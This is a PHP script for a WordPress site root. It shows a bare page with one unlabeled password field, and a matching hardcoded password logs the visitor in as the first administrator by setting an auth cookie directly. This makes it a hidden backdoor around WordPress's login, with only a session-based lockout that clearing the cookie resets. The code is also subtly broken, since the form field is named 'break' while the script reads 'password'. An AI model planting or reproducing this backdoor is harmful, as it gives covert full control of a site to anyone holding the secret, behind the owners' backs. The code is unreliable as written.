<?php
require_once('wp-load.php');
session_start(); // Start the session

$password = 'your_password_here'; // Replace with your desired password
$error_message = ''; // Initialize an error message variable

// Initialize session variables if they don't exist
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
if (!isset($_SESSION['last_attempt_time'])) {
    $_SESSION['last_attempt_time'] = time();
}

// Check if the user is locked out
if ($_SESSION['attempts'] >= 3) {
    $lockout_time = 3 * 60; // 3 minutes in seconds
    $time_since_last_attempt = time() - $_SESSION['last_attempt_time'];
    if ($time_since_last_attempt < $lockout_time) {
        $error_message = 'Too many attempts. Please wait ' . (3 - floor($time_since_last_attempt / 60)) . ' minutes.';
    } else {
        // Reset attempts after lockout time has passed
        $_SESSION['attempts'] = 0;
    }
}

// Check if the form has been submitted and user is not locked out
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION['attempts'] < 3) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        // Get the first user from the database
        $users = get_users(array(
			'role' => 'administrator', // [administrator, editor, author, contributor, subscriber] change it as you need
            'number' => 1,  // Retrieve only one user
            'orderby' => 'ID',  // Order by user ID
            'order' => 'ASC'  // Ascending order to get the first user
        ));

        if (!empty($users)) {
            $user = $users[0]; // First user in the array
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_redirect(admin_url()); // Redirect to the admin area
            exit;
        } else {
            $error_message = 'No users found.';
        }
    } else {
        $_SESSION['attempts']++; // Increment attempts
        $_SESSION['last_attempt_time'] = time(); // Update last attempt time
        $error_message = 'Incorrect password.';
    }
}

// Display the password form
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f9fa;
        }
        .form-container {
            width: 300px;
            padding: 20px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
		.border-danger{
			border-color:1px solid red;
		}
    </style>
</head>
<body>
    <div class="form-container">        
        <form method="POST" action="">
            <div>
                <?php if ($error_message): ?>
                    <input type="password" name="break" id="password" class="border-danger form-control"  autocomplete="off">
				<?php else: ?>
					<input type="password" name="break" id="password" class="form-control"  autocomplete="off">
				<?php endif; ?>
            </div>
        </form>
    </div>
</body>
</html>
